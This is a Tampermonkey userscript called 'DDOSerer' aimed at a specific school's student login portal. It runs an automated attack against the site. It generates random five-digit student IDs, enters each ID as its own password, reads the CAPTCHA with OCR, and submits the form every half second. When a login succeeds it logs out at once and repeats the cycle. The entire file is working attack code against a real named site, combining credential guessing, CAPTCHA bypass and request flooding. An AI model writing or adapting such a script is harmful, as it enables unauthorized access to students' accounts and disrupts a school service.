// ==UserScript==
// @name         DDOSerer
// @version      3.1.1
// @author       Peemai545
// @description  Here we go!
// @namespace    http://tampermonkey.net/
// @match        https://skr.webactivity.online/*/
// @match        https://skr.webactivity.online/*/register_main.php
// @icon         https://www.google.com/s2/favicons?sz=64&domain=webactivity.online
// @license      GNU General Public License v3.0
// @require      https://cdn.jsdelivr.net/npm/tesseract.js@2.1.4
// ==/UserScript==

(function () {
    'use strict';

    const mainLists = ["https://skr.webactivity.online/student/"];
    const registerLists = ["https://skr.webactivity.online/student/register_main.php"];
    const logoutLists = ["https://skr.webactivity.online/student/register_logout.php"];

    const MinStudentID = 51500;
    const MaxStudentID = 53000;

    const AutoSubmitEnabled = true;
    const AutoSubmitInterval = 500;

    const DebuggerEnabled = false;

    function Logger(message) {if (DebuggerEnabled) {console.log(message);}}

    function getRandomNumber(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min;}

    async function generateRandomStudentID() {
        try {
            const randomValue = getRandomNumber(MinStudentID, MaxStudentID);
            return randomValue;
        } catch (error) {
            Logger("Error generating random student ID:", error);
            throw error;
        }
    }

    async function decodeCaptcha() {
        try {
            const captchaImage = document.querySelector("#imgCaptcha");
            if (!captchaImage) {
                throw new Error("Error: CAPTCHA image not found");
            }

            const {
                data: { text },
            } = await Tesseract.recognize(captchaImage.src, "eng", {
                tessedit_char_whitelist: "0123456789",
                logger: (m) => Logger(m),
            });
            const captchaValue = text.replace(/\D/g, "");
            return captchaValue;
        } catch (error) {
            Logger("Error decoding CAPTCHA:", error);
            throw error;
        }
    }

    async function populateFields() {
        try {
            const studentID = await generateRandomStudentID();
            const captchaValue = await decodeCaptcha();

            const studentIDInput = document.querySelector(
                'input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]'
            );
            const passwordInput = document.querySelector(
                'input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]'
            );
            const captchaInput = document.querySelector(
                'input[placeholder="พิมพ์ตัวเลขที่ปรากฏ"]'
            );

            if (studentIDInput && studentID) {
                studentIDInput.value = studentID;
            } else {
                throw new Error("Error: Student ID input field not found or student ID is empty!");
            }

            if (passwordInput && studentID) {
                passwordInput.value = studentID;
            } else {
                throw new Error("Error: Password input field not found or student ID is empty!");
            }

            if (captchaInput && captchaValue) {
                captchaInput.value = captchaValue;
            } else {
                throw new Error("Error: CAPTCHA input field not found or CAPTCHA value is empty!");
            }
        } catch (error) {
            Logger("Error populating fields:", error);
            throw error;
        }
    }

    async function autoSubmit() {
        try {
            const studentIDInput = document.querySelector(
                'input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]'
            );
            const passwordInput = document.querySelector(
                'input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]'
            );
            const captchaInput = document.getElementById("inCaptcha");

            if (!studentIDInput.value || !passwordInput.value) {
                Logger("Student ID or password input field is empty. Generating ID and PIN...");
                await populateFields();
            }

            if (!captchaInput || captchaInput.value.trim() === "") {
                Logger("Captcha input field is empty. Decoding captcha...");
                const captchaValue = await decodeCaptcha();
                if (captchaValue) {
                    captchaInput.value = captchaValue;
                    Logger("Captcha decoded and populated.");
                } else {
                    throw new Error("Error decoding captcha or decoded captcha is empty.");
                }
            }

            const submitButton = document.getElementById("Submit");
            if (submitButton) {
                submitButton.click();
                Logger('Button "Submit" clicked automatically');
            }
        } catch (error) {
            Logger("Error in autoSubmit:", error);
        }
    }

    function checkAndPerformActions() {
        const currentUrl = window.location.href;
        if (registerLists.includes(currentUrl)) {
            Logger("On register main page, performing actions...");
            window.location.href = logoutLists[0];
        } else if (mainLists.includes(currentUrl)) {
            Logger("On main page, performing actions...");
            populateFields();
            if (AutoSubmitEnabled) {
                setInterval(autoSubmit, AutoSubmitInterval);
            }
        }
    }

    window.addEventListener("load", () => {
        Logger("Page Loaded.");
        checkAndPerformActions();
    });
})();
